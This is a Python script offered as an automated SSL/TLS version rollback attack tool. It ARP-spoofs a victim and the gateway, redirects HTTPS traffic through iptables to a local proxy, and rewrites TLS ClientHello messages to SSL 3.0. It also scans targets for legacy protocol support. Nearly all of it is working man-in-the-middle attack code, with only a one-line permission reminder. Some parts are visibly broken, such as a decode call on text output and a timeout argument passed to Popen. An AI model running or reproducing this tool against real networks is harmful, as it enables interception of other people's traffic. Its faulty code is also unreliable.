#!/usr/bin/env python3
"""
ssl_downgrade.py - SSL/TLS Version Rollback Attack (Full Attack)
"""

import socket
import struct
import threading
import subprocess
import argparse
import sys
import time
import os

try:
    from scapy.all import Ether, ARP, send, conf, get_if_hwaddr, get_if_addr, get_working_if
    from scapy.layers.l2 import getmacbyip
except ImportError:
    print("[ERROR] Scapy is not installed. Please install it using: pip install scapy")
    sys.exit(1)

class SSLDowngradeAttack:
    def __init__(self, target_host, target_port=443, proxy_port=8443, iface=None, victim_ip=None, gateway_ip=None):
        self.target_host = target_host
        self.target_port = target_port
        self.proxy_port = proxy_port
        self.proxy_running = False
        self.iface = iface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attacker_ip = None
        self.attacker_mac = None
        self.victim_mac = None
        self.gateway_mac = None
        self.arp_stop_event = threading.Event()
        self.arp_threads = []
        self.initial_ip_forward_state = None
        self.iptables_rules_added = False

    def _get_network_info(self):
        """Attempts to auto-detect network interface, attacker IP, and gateway IP."""
        if not self.iface:
            try:
                self.iface = get_working_if()
                print(f"[INFO] Auto-detected interface: {self.iface}")
            except Exception:
                print("[ERROR] Could not auto-detect network interface. Please specify with --interface.")
                sys.exit(1)

        try:
            self.attacker_ip = get_if_addr(self.iface)
            self.attacker_mac = get_if_hwaddr(self.iface)
            print(f"[INFO] Attacker IP: {self.attacker_ip}, MAC: {self.attacker_mac}")
        except Exception:
            print(f"[ERROR] Could not get IP/MAC for interface {self.iface}. Check interface name and permissions.")
            sys.exit(1)

        if not self.gateway_ip:
            try:
                route_output = subprocess.check_output(["ip", "r"], text=True).decode('utf-8', errors='ignore')
                for line in route_output.splitlines():
                    if "default via" in line:
                        self.gateway_ip = line.split("default via")[1].split(" ")[1].strip()
                        print(f"[INFO] Auto-detected gateway IP: {self.gateway_ip}")
                        break
                if not self.gateway_ip:
                    print("[ERROR] Could not auto-detect gateway IP. Please specify with --gateway-ip.")
                    sys.exit(1)
            except Exception as e:
                print(f"[ERROR] Failed to get gateway IP: {e}. Please specify with --gateway-ip.")
                sys.exit(1)

        if not self.victim_ip:
            print("[ERROR] Victim IP (--victim-ip) is required for the full attack.")
            sys.exit(1)

        try:
            self.victim_mac = getmacbyip(self.victim_ip)
            self.gateway_mac = getmacbyip(self.gateway_ip)
            if not self.victim_mac:
                print(f"[ERROR] Could not get MAC address for victim IP: {self.victim_ip}. Is the victim online and reachable?")
                sys.exit(1)
            if not self.gateway_mac:
                print(f"[ERROR] Could not get MAC address for gateway IP: {self.gateway_ip}. Is the gateway online and reachable?")
                sys.exit(1)
            print(f"[INFO] Victim MAC: {self.victim_mac}, Gateway MAC: {self.gateway_mac}")
        except Exception as e:
            print(f"[ERROR] Failed to get MAC addresses: {e}. Ensure Scapy can resolve MACs.")
            sys.exit(1)

    def _enable_ip_forwarding(self):
        """Enables IP forwarding."""
        try:
            result = subprocess.run(["sysctl", "net.ipv4.ip_forward"], capture_output=True, text=True, check=True)
            self.initial_ip_forward_state = result.stdout.strip().split('=')[1].strip()

            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            print("[+] IP forwarding enabled.")
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Failed to enable IP forwarding: {e.stderr.strip()}")
            sys.exit(1)
        except Exception as e:
            print(f"[ERROR] An error occurred while enabling IP forwarding: {e}")
            sys.exit(1)

    def _disable_ip_forwarding(self):
        """Disables IP forwarding, restoring to initial state."""
        try:
            if self.initial_ip_forward_state is not None:
                subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={self.initial_ip_forward_state}"], check=True)
                print(f"[-] IP forwarding restored to {self.initial_ip_forward_state}.")
            else:
                print("[-] IP forwarding was not modified by this script or its initial state is unknown.")
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Failed to disable IP forwarding: {e.stderr.strip()}")
        except Exception as e:
            print(f"[ERROR] An error occurred while disabling IP forwarding: {e}")

    def _start_arp_spoofing(self):
        """Starts continuous ARP spoofing in background threads."""
        print("[+] Starting ARP spoofing...")

        def spoof_target(target_ip, target_mac, source_ip, source_mac, iface, stop_event):
            arp_packet = Ether(src=source_mac, dst=target_mac) / ARP(op="is-at", psrc=source_ip, pdst=target_ip, hwsrc=source_mac, hwdst=target_mac)
            while not stop_event.is_set():
                send(arp_packet, iface=iface, verbose=0)
                time.sleep(2)

        t1 = threading.Thread(target=spoof_target, args=(self.victim_ip, self.victim_mac, self.gateway_ip, self.attacker_mac, self.iface, self.arp_stop_event), daemon=True)
        self.arp_threads.append(t1)
        t1.start()

        t2 = threading.Thread(target=spoof_target, args=(self.gateway_ip, self.gateway_mac, self.victim_ip, self.attacker_mac, self.iface, self.arp_stop_event), daemon=True)
        self.arp_threads.append(t2)
        t2.start()

        print(f"[+] ARP spoofing initiated: {self.victim_ip} <-> {self.attacker_ip} <-> {self.gateway_ip}")

    def _stop_arp_spoofing(self):
        """Stops ARP spoofing threads and restores ARP tables."""
        print("[-] Stopping ARP spoofing...")
        self.arp_stop_event.set()
        for t in self.arp_threads:
            if t.is_alive():
                t.join(timeout=1)

        print("[*] Sending ARP restoration packets...")
        try:
            send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst=self.victim_mac, hwsrc=self.gateway_mac), iface=self.iface, count=5, verbose=0)
            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=self.gateway_mac, hwsrc=self.victim_mac), iface=self.iface, count=5, verbose=0)
            print("[+] ARP tables restored.")
        except Exception as e:
            print(f"[ERROR] Failed to send ARP restoration packets: {e}")

    def _setup_iptables(self):
        """Sets up iptables rules to redirect traffic to the proxy."""
        print("[+] Setting up iptables rules...")
        try:
            subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(self.proxy_port)], check=True)
            self.iptables_rules_added = True
            print(f"[+] IPTables rule added: Redirecting port 443 to {self.proxy_port}.")
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Failed to add iptables rules: {e.stderr.strip()}")
            sys.exit(1)
        except Exception as e:
            print(f"[ERROR] An error occurred during iptables setup: {e}")
            sys.exit(1)

    def _cleanup_iptables(self):
        """Removes the iptables rules added by the script."""
        if self.iptables_rules_added:
            print("[-] Cleaning up iptables rules...")
            try:
                subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(self.proxy_port)], check=True, stderr=subprocess.PIPE)
                print("[-] IPTables rule removed.")
            except subprocess.CalledProcessError as e:
                if "No such file or directory" not in e.stderr and "No chain/target/match" not in e.stderr:
                    print(f"[WARNING] Failed to remove iptables rule gracefully: {e.stderr.strip()}")
            except Exception as e:
                print(f"[ERROR] An error occurred during iptables cleanup: {e}")
        else:
            print("[-] No iptables rules were added by this script, skipping cleanup.")

    def create_fake_client_hello(self, original_data):
        """
        Modifies a TLS ClientHello packet to downgrade the advertised SSL/TLS version
        to an older, potentially vulnerable version (e.g., SSL 3.0).
        """
        try:
            # Check if it's a TLS record and ClientHello handshake message
            if len(original_data) < 11 or original_data[0] != 0x16 or original_data[5] != 0x01:
                return original_data

            modified = bytearray(original_data)
            
            # Downgrade Record Layer Version to SSL 3.0 (0x0300)
            modified[1:3] = struct.pack('>H', 0x0300)
            
            # Downgrade Handshake Protocol Version (ClientHello) to SSL 3.0 (0x0300)
            # The ClientHello version is at byte 9 (relative to start of record)
            modified[9:11] = struct.pack('>H', 0x0300)

            print(f"[ATTACK] Downgraded ClientHello version to SSL 3.0 for {self.target_host}.")
            return bytes(modified)
        except Exception as e:
            print(f"[ERROR] Downgrade modification failed: {e}")
            return original_data

    def handle_client_connection(self, client_socket):
        """
        Handles a single client connection, forwarding traffic to the target
        and modifying ClientHello messages for version rollback.
        """
        try:
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.connect((self.target_host, self.target_port))
            print(f"[INFO] Proxying connection from {client_socket.getpeername()} to {self.target_host}:{self.target_port}")

            def forward(source, dest, modify=False):
                """Internal helper to forward data between sockets."""
                try:
                    while self.proxy_running:
                        data = source.recv(4096)
                        if not data:
                            break
                        if modify:
                            data = self.create_fake_client_hello(data)
                        dest.send(data)
                except Exception as e:
                    if "forcibly closed" not in str(e).lower() and "connection reset by peer" not in str(e).lower():
                        print(f"[ERROR] Forward error: {e}")
                finally:
                    try:
                        source.shutdown(socket.SHUT_RDWR)
                        source.close()
                    except: pass
                    try:
                        dest.shutdown(socket.SHUT_RDWR)
                        dest.close()
                    except: pass

            t1 = threading.Thread(target=forward, args=(client_socket, target_socket, True), daemon=True)
            t2 = threading.Thread(target=forward, args=(target_socket, client_socket, False), daemon=True)

            t1.start()
            t2.start()
            t1.join()
            t2.join()
        except Exception as e:
            print(f"[ERROR] Connection handling error: {e}")
        finally:
            try:
                client_socket.shutdown(socket.SHUT_RDWR)
                client_socket.close()
            except: pass

    def start_proxy(self):
        """
        Starts the SSL/TLS version rollback proxy server.
        Listens for incoming connections and spawns threads to handle them.
        """
        print(f"[INFO] Starting SSL/TLS downgrade proxy on 0.0.0.0:{self.proxy_port}")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            server.bind(('0.0.0.0', self.proxy_port))
            server.listen(5)
        except Exception as e:
            print(f"[ERROR] Proxy bind failed on port {self.proxy_port}: {e}")
            return False

        self.proxy_running = True
        print(f"[INFO] Proxy listening. Ensure traffic is redirected (e.g., via iptables).")
        try:
            while self.proxy_running:
                client_sock, addr = server.accept()
                print(f"[INFO] Accepted connection from {addr}")
                threading.Thread(target=self.handle_client_connection, args=(client_sock,), daemon=True).start()
        except KeyboardInterrupt:
            print("\n[INFO] SSL/TLS Downgrade proxy stopped by user interrupt.")
        except Exception as e:
            print(f"[ERROR] Proxy server error: {e}")
        finally:
            self.proxy_running = False
            try:
                server.shutdown(socket.SHUT_RDWR)
                server.close()
            except: pass
        return True

    def test_downgrade_vulnerability(self):
        """
        Tests the target for SSL/TLS version downgrade vulnerability using OpenSSL's s_client.
        """
        print(f"[TEST] Testing {self.target_host} for SSL/TLS version rollback vulnerability...")
        
        vulnerable_protocols = ['ssl3', 'tls1', 'tls1_1']
        found_vulnerabilities = []

        for protocol in vulnerable_protocols:
            print(f"[INFO] Attempting connection with OpenSSL s_client using -{protocol}...")
            try:
                process = subprocess.Popen(
                    ['openssl', 's_client', '-connect', f'{self.target_host}:{self.target_port}',
                     f'-{protocol}', '-quiet', '-no_ign_eof', '-servername', self.target_host],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True,
                    timeout=15
                )
                stdout, stderr = process.communicate(input='\n', timeout=15)

                if "Cipher is" in stdout and "Protocol" in stdout and "NONE" not in stdout.upper():
                    protocol_line = next((line for line in stdout.splitlines() if "Protocol  :" in line), None)
                    if protocol_line:
                        negotiated_protocol = protocol_line.split(":")[1].strip().upper()
                        if negotiated_protocol in ['SSLV3', 'TLSV1', 'TLSV1.0', 'TLSV1.1']:
                            found_vulnerabilities.append(negotiated_protocol)
                            print(f"[VULNERABLE] Target accepts {negotiated_protocol}")
                        else:
                            print(f"[INFO] OpenSSL negotiated {negotiated_protocol} (expected {protocol.upper()})")
                elif "Cipher" in stdout and "NONE" not in stdout.upper():
                     print(f"[INFO] OpenSSL connected with {protocol} (details in stdout/stderr)")
                else:
                    print(f"[SECURE] OpenSSL rejected {protocol}.")
                
                if stderr:
                    # Filter out common non-error messages from stderr (e.g., 'Verification: OK')
                    filtered_stderr_lines = [line for line in stderr.splitlines() if not any(kw in line for kw in ["Verify return code:", "depth", "issuer", "subject", "return code: 0"])]
                    if filtered_stderr_lines:
                        print(f"[STDERR] OpenSSL stderr for {protocol}: {os.linesep.join(filtered_stderr_lines)}")

            except subprocess.TimeoutExpired:
                process.kill()
                print(f"[ERROR] OpenSSL test timed out for {protocol}. Target might be slow or blocking.")
            except FileNotFoundError:
                print(f"[ERROR] 'openssl' command not found. Please ensure OpenSSL is installed and in your PATH.")
                return False
            except Exception as e:
                print(f"[ERROR] OpenSSL test error for {protocol}: {e}")

        if found_vulnerabilities:
            print(f"\n[RESULT] Target is VULNERABLE to version rollback, accepting: {', '.join(found_vulnerabilities)}")
            return True
        else:
            print("\n[RESULT] Target appears SECURE against SSL/TLS version rollback.")
            return False

def run_ssl_downgrade_attack(target, port=443, test_mode=False, proxy_port=8443,
                             iface=None, victim_ip=None, gateway_ip=None):
    """
    Main function to run the SSL/TLS Version Rollback Attack.
    Handles full MITM setup if not in test_mode.
    """
    print("\n" + "="*70)
    print("SSL/TLS VERSION ROLLBACK ATTACK TOOL (FULL AUTOMATED MITM)")
    print("="*70)
    print(f"Target: {target}:{port}")
    print(f"Proxy Listen Port: {proxy_port}")
    print(f"Mode: {'Test/Detection Only' if test_mode else 'Full Attack (Automated MITM)'}")
    if victim_ip: print(f"Victim IP: {victim_ip}")
    if iface: print(f"Interface: {iface}")
    if gateway_ip: print(f"Gateway IP: {gateway_ip}")
    print("="*70 + "\n")

    if not test_mode:
        if os.geteuid() != 0:
            print("[CRITICAL] This full attack must be run as root (use sudo). Exiting.")
            sys.exit(1)
        print("[WARNING] Running in full attack mode. This will modify system network settings (IP forwarding, ARP, iptables).")
        print("[WARNING] Ensure you have permission to perform this on the target network.")
        time.sleep(3) # Give user time to read warning

    attack = SSLDowngradeAttack(target, port, proxy_port, iface, victim_ip, gateway_ip)

    mitm_success = False
    try:
        print("\n[*] Running initial vulnerability test...")
        if not attack.test_downgrade_vulnerability():
            print("\n[INFO] Target appears secure against SSL/TLS version rollback. Not launching attack proxy.")
            return False

        if test_mode:
            print("\n[INFO] Test mode finished. No MITM attack was launched.")
            return True

        print("\n[ATTACK] Target appears VULNERABLE! Proceeding with automated MITM setup...")
        attack._get_network_info()
        attack._enable_ip_forwarding()
        attack._setup_iptables()
        attack._start_arp_spoofing()
        mitm_success = True

        print("\n[SUCCESS] MITM setup complete. Starting SSL/TLS downgrade proxy...")
        return attack.start_proxy()
    except Exception as e:
        print(f"[CRITICAL ERROR] Attack failed during setup or execution: {e}")
        return False
    finally:
        if mitm_success:
            print("\n[*] Cleaning up MITM environment...")
            attack._stop_arp_spoofing()
            attack._cleanup_iptables()
            attack._disable_ip_forwarding()
            print("[+] MITM cleanup complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SSL/TLS Version Rollback Attack Tool (Automated MITM)')
    parser.add_argument("target", help='Target hostname or IP (e.g., website.com or 10.0.0.1)')
    parser.add_argument("-p", "--port", type=int, default=443, help='Target Port (default: 443)')
    parser.add_argument("-t", "--test", action="store_true", help='Test for vulnerability only (no MITM setup)')
    parser.add_argument("--proxy-port", type=int, default=8443, help='Proxy listen port (default: 8443)')
    parser.add_argument("--iface", help='Network interface to use for MITM (e.g., eth0, wlan0). Auto-detected if not specified.')
    parser.add_argument('--victim-ip', help='IP address of the victim machine (REQUIRED for full attack)')
    parser.add_argument('--gateway-ip', help='IP address of the network gateway (Auto-detected if not specified)')

    args = parser.parse_args()

    success = run_ssl_downgrade_attack(
        target=args.target,
        port=args.port,
        test_mode=args.test,
        proxy_port=args.proxy_port,
        iface=args.iface,
        victim_ip=args.victim_ip,
        gateway_ip=args.gateway_ip
    )
    sys.exit(0 if success else 1)
